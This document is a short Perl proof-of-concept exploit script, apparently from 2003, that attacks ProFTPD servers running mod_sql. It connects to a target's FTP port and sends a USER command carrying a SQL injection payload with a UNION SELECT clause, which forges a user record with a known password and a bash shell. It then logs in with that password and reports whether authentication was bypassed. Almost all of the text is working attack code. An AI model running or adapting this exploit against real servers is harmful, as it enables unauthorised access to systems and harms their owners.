#!/usr/bin/perl
# Sql inject on ProFTPD with mod_sql proof of concept script
# runlevel [ runlevel@raregazz.org ]
# Spain, 2003

use IO::Socket;
if(@ARGC<2){
    print "\nProof Of Concept Sql Inject on ProFTPD\n";
    print "Usage: perl poc-sqlftp <target> [1=Alternate query]\n\n";
    exit(0);
};

$server = $ARGV[0];
$query = $ARGV[1];
$remote = IO::Socket::INET->new(Proto=>"tcp",PeerAddr=>$server,PeerPort=>"21",Reuse=>1) 
                          or die "Can't connect. \n";
if(defined($line=<$remote>)){
    print STDOUT $line;
}

# Proof of concept query, it may change on the number of rows
# By default, it can query User, Pass, Uid, Gid, Shell or
# User, Pass, Uid, Gid, Shell, Path, change the union query...

if($query eq "1"){
    print $remote "USER ')UNION SELECT'u','p',1002,1002,'/tmp','/bin/bash'WHERE(''='\n";
}else{
    print $remote "USER ')UNION SELECT'u','p',1002,1002,'/bin/bash' WHERE(''='\n";
};
if(defined($line=<$remote>)){
    print STDOUT $line;
}
print $remote "PASS p\n";
if(defined($line=<$remote>)){
    print STDOUT $line;
}
print "Sent query to $ARGV[0]\n";
if($line =~ /230/){  #logged in
    print "[------- Sql Inject Able \n";
}else{
    print "[------- Sql Inject Unable \n";
}
close $remote;
